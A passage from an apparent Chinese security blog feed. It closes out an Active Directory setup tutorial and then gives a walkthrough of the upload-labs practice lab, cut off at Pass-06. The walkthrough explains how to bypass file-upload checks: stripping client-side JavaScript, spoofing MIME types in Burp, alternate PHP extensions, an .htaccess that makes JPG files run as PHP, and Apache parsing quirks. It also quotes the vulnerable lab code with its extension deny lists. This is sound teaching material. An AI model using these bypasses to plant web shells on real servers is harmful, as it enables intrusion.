src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%883.54.56.png" alt="image"></p><p>在此处可以设置数据库、日志、sysvol文件的位置，我们采用默认，继续下一步</p><p>注：组策略是放置在sysvol目录下的，这个目录需要当前分区的格式为NTFS</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%883.56.12.png" alt="image"></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%883.59.01.png" alt="image"></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.18.56.png" alt="image"></p><p>可以看到在配置成功以后，本账号就不存在了，取而代之的是域账号<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.24.04.png" alt="image"></p><h3 id="0x04-AD安装后的检查"><a href="#0x04-AD安装后的检查" class="headerlink" title="0x04 AD安装后的检查"></a>0x04 AD安装后的检查</h3><hr><p>1.修改DNS地址，指向自己的地址（最好不要是127.0.0.1）</p><p>2.DNS的SRV记录不全，可以通过重新服务来解决,重启服务的命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net stop netlogon</span><br><span class="line"></span><br><span class="line">net start netlogon</span><br></pre></td></tr></table></figure><p>注：如果记录少的话，下面的计算机可以能找不到域控制器</p><p>完整的DNS SRV记录如下所示<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.31.05.png" alt="image"></p><p>3.查看DC的完整名称</p><p>可以看到其名称后面加上了域的名称<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.34.11.png" alt></p><p>4.活动目录和计算机管理工具</p><h3 id="0x05-DNS中SRV记录注册"><a href="#0x05-DNS中SRV记录注册" class="headerlink" title="0x05 DNS中SRV记录注册"></a>0x05 DNS中SRV记录注册</h3><hr><p>1.参照4.2，强制域控制器向DNS注册SRV记录</p><p>2人工进行创建，如果创建之后还不全，直接重启Netlogon即可。</p><p>注：其中有一个不变的记录–“_msdcs.域名”</p><p>3.委派</p><h3 id="0x06-将计算机加入域"><a href="#0x06-将计算机加入域" class="headerlink" title="0x06 将计算机加入域"></a>0x06 将计算机加入域</h3><hr><h4 id="step-1"><a href="#step-1" class="headerlink" title="step 1:"></a>step 1:</h4><p>在客户端计算机上，我们首先要确保我们可以ping通zeroyu.lab</p><p>注：如果ping不通的话，检测一下客户端计算机的DNS值是否设置为了DC的IP值（因为在这个内网环境中，我们的DC还有DNS的角色）</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.28.32.png" alt="image"></p><h4 id="step-2"><a href="#step-2" class="headerlink" title="step 2:"></a>step 2:</h4><p>在修改计算机名称的地方，将隶属于工作组修改为隶属于域并写上我们的域名。之后，如果没有问题的话，就会让你输入一个域账户，域账户验证通过之后计算机就成功加入了域。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.38.59.png" alt="image"></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.45.06.png" alt="image"></p><h4 id="step-3"><a href="#step-3" class="headerlink" title="step 3:"></a>step 3:</h4><p>我们可以创建域账户来登录已经加入域的计算机</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.49.43.png" alt="image"></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.51.11.png" alt="image"></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.51.35.png" alt="image"></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.55.49.png" alt="image"></p><p><strong>注：</strong><br>集中身份验证，其实就是一次性对一个组的成员进行共享授权</p><p>把域用户添加到本地管理员组</p><p>域管理员默认是本地管理员组内成员</p><h3 id="0x07-使用组策略集中管理用户和计算机"><a href="#0x07-使用组策略集中管理用户和计算机" class="headerlink" title="0x07 使用组策略集中管理用户和计算机"></a>0x07 使用组策略集中管理用户和计算机</h3><hr><p>强制更新组策略<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate /force</span><br></pre></td></tr></table></figure></p><p>计算机开机首先会到DC查看计算机所在组的组策略</p><p>用户登录时，计算机会向DC查看用户所属组的组策略</p><p>使用组策略部署软件时，只能部署msi结尾的文件</p><p>使用组策略管理器可以设置使普通域账户也可以登录DC</p><p>域中可以部署多台DC实现容错，但要注意DNS也要实现容错并且在域中的计算机上要设置多个DNS</p><p>活动目录站点可以控制站点之间的复制，进而优化两个使用VPN链接的域之间的用户登录等问题</p><h3 id="0x08-域中主控"><a href="#0x08-域中主控" class="headerlink" title="0x08 域中主控"></a>0x08 域中主控</h3><hr><p>PDC：防止站点名的重复；加快密码同步</p><p>RID主控：RID块，限制一次创建用户的数量</p><p>基础架构主控：负责更新其它域中对某个对象的引用</p><p>注：一个域中的第一个DC默认负责以上三个功能</p><p>强制某个DC成为域中的PDC/RID/基础架构主控</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil命令的使用</span><br></pre></td></tr></table></figure><p>注：前提是此域林中的PDC域控坏掉了或者链接不上了</p><h3 id="0x09-附录"><a href="#0x09-附录" class="headerlink" title="0x09 附录"></a>0x09 附录</h3><p>推荐：</p><p><a href="http://edu.51cto.com/center/course/lesson/index?id=46874" target="_blank" rel="noopener">基础视频课程</a></p><p><a href="http://docs.ioin.in/writeup/xianzhi.aliyun.com/_forum_read_805_html/index.html" target="_blank" rel="noopener">域渗透基础简单信息收集（基础篇）</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-基础知识&quot;&gt;&lt;a href=&quot;#0x01-基础知识&quot; class=&quot;headerlink&quot; title=&quot;0x01 基础知识&quot;&gt;&lt;/a&gt;0x01 基础知识&lt;/h3&gt;&lt;hr&gt;
&lt;h4 id=&quot;工作组&quot;&gt;&lt;a href=&quot;#工作组&quot; class=&quot;heade
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>文件上传漏洞天书</title>
    <link href="http://zer0yu.github.io/2018/06/18/upload-labs-note/"/>
    <id>http://zer0yu.github.io/2018/06/18/upload-labs-note/</id>
    <published>2018-06-18T07:00:26.000Z</published>
    <updated>2018-06-18T07:27:01.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>文件上传漏洞可以说是getshell的一种好方式了，也是常见漏洞之一，本文结合<a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">upload-labs</a>来对此种漏洞在PHP中的表现做一讲解。本文列出的参考链接都是一些不错的文章，像关于一些waf的上传bypass在本文不作讲解但是在参考链接的文章中就有包含。</p><h3 id="0x01-Pass-01"><a href="#0x01-Pass-01" class="headerlink" title="0x01 Pass-01"></a>0x01 Pass-01</h3><p>这是一个前端验证的上传点，针对这种情况我们一般有以下4种绕过方法。</p><h4 id="1-禁用js"><a href="#1-禁用js" class="headerlink" title="(1) 禁用js"></a>(1) 禁用js</h4><p>firefox和chrome均有禁用js设置，禁用了就可以绕过。</p><h4 id="2-上传按钮处修改"><a href="#2-上传按钮处修改" class="headerlink" title="(2) 上传按钮处修改"></a>(2) 上传按钮处修改</h4><p>打开web控制台删除如图所示处的<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onsubmit=<span class="string">"return checkFile()"</span></span><br></pre></td></tr></table></figure></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-16%20%E4%B8%8B%E5%8D%889.47.30.png" alt></p><h4 id="3-构造上传点"><a href="#3-构造上传点" class="headerlink" title="(3) 构造上传点"></a>(3) 构造上传点</h4><p>与2的原理是相同的，使用了和原来代码一样但是不包含<code>onsubmit=&quot;return checkFile()&quot;</code>这句代码</p><p>Like</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>upload-php<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"upload_panel"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span>&gt;</span>上传区<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"此处填写完整的上传点URL"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span>&gt;</span>请选择要上传的图片：<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"input_file"</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"upload_file"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"button"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"上传"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="4-修改js代码"><a href="#4-修改js代码" class="headerlink" title="(4) 修改js代码"></a>(4) 修改js代码</h4><p>只需要修改js代码中的限制，让其包含你想上传的后缀名即可。</p><p>此处我们在checkFile()函数中的allow_ext变量中加入.php，之后在console run一下这段代码，随后上传便可成功。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">        alert(<span class="string">"请选择要上传的文件!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif.|.php"</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>####(5) 神器burp</p><p>先将想要上传的php脚本的后缀修改为jpg绕过前端，使用burp截断后修改jpg为php继续上传即可。<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-16%20%E4%B8%8B%E5%8D%8810.14.06.png" alt="image"></p><h3 id="0x02-Pass-02"><a href="#0x02-Pass-02" class="headerlink" title="0x02 Pass-02"></a>0x02 Pass-02</h3><p>查看代码发现是在服务端对文件的mime类型进行了校验。对于这种情况我们只需要使用burp抓包并修改content-type字段的内容即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        <span class="comment">// 以下这个判断是在对上传文件的mime类型做判断</span></span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-16%20%E4%B8%8B%E5%8D%8810.23.57.png" alt="image"></p><h3 id="0x03-Pass-03"><a href="#0x03-Pass-03" class="headerlink" title="0x03 Pass-03"></a>0x03 Pass-03</h3><p>看了下代码发现黑名单对常见文件名进行了过滤，但是类似于”.php5”,”.php4”,”.php3”,”.php2”,”php1”这样的也是可以被当做php进行解析的。所以我们这时只需要将文件名修改为.php5就可以成功上传shell<br>注: 这个也是要服务器支持的，如果发现不能解析可以在apache配置文件中添加如下设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType Application/x-httpd-php .php .php3 .php5 .html</span><br></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8A%E5%8D%8811.58.09.png" alt="image"><br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8A%E5%8D%8811.58.21.png" alt="image"></p><h3 id="0x04-Pass-04"><a href="#0x04-Pass-04" class="headerlink" title="0x04 Pass-04"></a>0x04 Pass-04</h3><p>先看下代码，此处过滤的很严，所以此时要考虑下apache的解析特性。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先介绍下.htaccess文件:</p><p>(1) .htaccess是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。</p><p>(2) .htaccess主要的作用有：URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义404错误页面、阻止/允许特定IP/IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。</p><p>(3) .htaccess的用途范围主要针对当前目录。</p><p>由上面可知在此处我们可以先上传一个.htaccess文件，来使apache可以将jpg文件当做php文件解析，但要注意并不是任何时候都可以上传一个有效的.htaccess文件的，在让.htaccess文件生效之前我们需要做两点配置：</p><p>(1) 修改httpd.conf，启用AllowOverride，即将如下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AllowOverride None</span><br></pre></td></tr></table></figure><p>修改为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AllowOverride All</span><br></pre></td></tr></table></figure><p>(2) 修改httpd.conf，增加如下语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadModule rewrite_module modules/mod_rewrite.so</span><br></pre></td></tr></table></figure><p>第一步: 在.htaccess文件中写入如下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>上传.htaccess<br>第二步: 修改shell.php为shell.jpg然后访问即可发现服务器对其进行了解析</p><p>注: 此处的方法在Pass-03中也是可以使用的</p><h3 id="0x05-Pass-05"><a href="#0x05-Pass-05" class="headerlink" title="0x05 Pass-05"></a>0x05 Pass-05</h3><p>首先分析代码，我们可以看到这句<code>$file_ext = strrchr($file_name, &#39;.&#39;);</code>中的<code>strrchr()</code>函数是有点问题的。这个函数的意思是“函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符”。</p><p>又考虑到apache的1.x版本和2.x版本是存在解析漏洞的，即“当碰到不认识的扩展名时，将会从后向前解析，直到碰到认识的 扩展名，如果都不认识，则会暴露其源码。比如 1.php.rar.ss.aa 会被当做PHP脚本执行”。</p><p>所以在此我们只需要将我们shell.php的名称修改为shell.php.ace.aaa，然后上传即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%8812.54.13.png" alt="image"></p><p>注: 此处的黑名单是没有完全过滤的，并且在此处也没有将上传文件名转换为小写，比如形如shell.phP就可以达到上传绕过的目的</p><h3 id="0x06-Pass-06"><a href="#0x06-Pass-06" class="headerlink" title="0x06 Pass-06"></a>0x06 Pass-06</h3><p>从代码可以看到过滤的可以说很严了，所以这个时候我们要考虑下操作系统的特性，此处前18题均使用Windows操作系统，而Windows操作系统对文件的命名规则是有特点的，比如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td 